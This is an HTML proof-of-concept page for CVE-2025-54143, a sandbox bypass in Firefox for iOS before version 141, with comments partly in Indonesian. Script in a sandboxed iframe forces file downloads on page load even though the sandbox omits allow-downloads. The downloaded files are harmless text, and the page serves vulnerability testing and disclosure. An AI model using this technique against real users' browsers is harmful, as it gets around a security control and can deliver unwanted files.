<!DOCTYPE html>
<html>
<head>
    <title>Sandbox Bypass PoC — CVE-2025-54143</title>
</head>
<body>
    <h1>Firefox iOS Sandbox Bypass — Download PoC</h1>
    <p>If you are using Firefox for iOS &lt; 141, this iframe will trigger a download despite being sandboxed without <code>allow-downloads</code>.</p>

    <!-- 
      Atribut sandbox="allow-scripts" TIDAK menyertakan allow-downloads.
      Namun, karena bug CVE-2025-54143, download tetap bisa dipicu.
    -->
    <iframe 
        srcdoc="
            <html>
            <body>
                <script>
                    // Membuat anchor element untuk memicu download
                    var a = document.createElement('a');
                    a.href = 'data:application/octet-stream;base64,' + 
                             btoa('Ini adalah file bukti konsep sandbox bypass.');
                    a.download = 'sandbox_bypass_poc.txt';
                    document.body.appendChild(a);
                    a.click();
                    
                    // Alternatif: menggunakan fetch + blob untuk file lebih besar
                    async function triggerDownload() {
                        const blob = new Blob([
                            'Sandbox Bypass Successful!',
                            '\\nCVE-2025-54143',
                            '\\nFirefox iOS < 141'
                        ], { type: 'application/octet-stream' });
                        
                        const url = URL.createObjectURL(blob);
                        const link = document.createElement('a');
                        link.href = url;
                        link.download = 'cve-2025-54143-poc.txt';
                        document.body.appendChild(link);
                        link.click();
                        URL.revokeObjectURL(url);
                    }
                    
                    triggerDownload();
                </script>
                <p>Sandboxed iframe content — download should be BLOCKED but Firefox iOS &lt; 141 will allow it.</p>
            </body>
            </html>
        "
        sandbox="allow-scripts"
        style="width: 100%; height: 200px; border: 2px solid red;">
    </iframe>

    <p><strong>Catatan:</strong> Jika download terpicu, maka perangkat rentan terhadap CVE-2025-54143.</p>
</body>
</html>
